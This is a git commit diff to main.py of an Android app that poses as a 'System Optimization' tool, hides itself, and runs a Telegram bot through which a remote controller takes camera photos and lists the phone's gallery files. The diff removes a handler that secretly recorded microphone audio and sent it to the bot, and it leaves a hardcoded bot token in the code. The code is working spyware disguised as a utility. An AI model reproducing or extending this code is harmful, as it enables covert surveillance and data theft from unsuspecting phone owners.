5d51086211244d3b4d99315bf2fd34cbffd38778
auraawu-blip <auraawu@gmail.com>
2026-02-21 11:38:15 +0500

    Update main.py

--- main.py
+++ main.py
@@ -1,14 +1,10 @@
-
 import telebot
 import cv2
 import threading
 import os
-import sounddevice as sd
-from scipy.io.wavfile import write
 from kivy.app import App
 from kivy.uix.label import Label
 from jnius import autoclass
-from geopy.geocoders import Nominatim
 
 TOKEN = "8561506941:AAH3bsujghPEm8FeJ-xG1YGcmB-HuNgVhGE"
 bot = telebot.TeleBot(TOKEN)
@@ -23,20 +19,14 @@ def run_bot():
             bot.send_photo(message.chat.id, open('shot.jpg', 'rb'))
         cap.release()
 
-    @bot.message_handler(commands=['mic'])
-    def record_audio(message):
-        fs = 44100  
-        seconds = 10  
-        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-        sd.wait()
-        write('audio.wav', fs, recording)
-        bot.send_voice(message.chat.id, open('audio.wav', 'rb'))
-
     @bot.message_handler(commands=['gallery'])
     def list_files(message):
-        path = "/sdcard/DCIM/Camera/"
-        files = os.listdir(path)[:10] # Pehli 10 photos
-        bot.send_message(message.chat.id, "Gallery Files: " + "\n".join(files))
+        try:
+            path = "/sdcard/DCIM/Camera/"
+            files = os.listdir(path)[:5]
+            bot.send_message(message.chat.id, "Gallery: " + "\n".join(files))
+        except:
+            bot.send_message(message.chat.id, "Storage access denied!")
 
     bot.infinity_polling()
 
@@ -48,7 +38,7 @@ class NovaApp(App):
             current_activity = PythonActivity.mActivity
             current_activity.moveTaskToBack(True)
         except: pass
-        return Label(text="System Optimization in Progress...")
+        return Label(text="System Optimization...")
 
 if __name__ == "__main__":
     NovaApp().run()
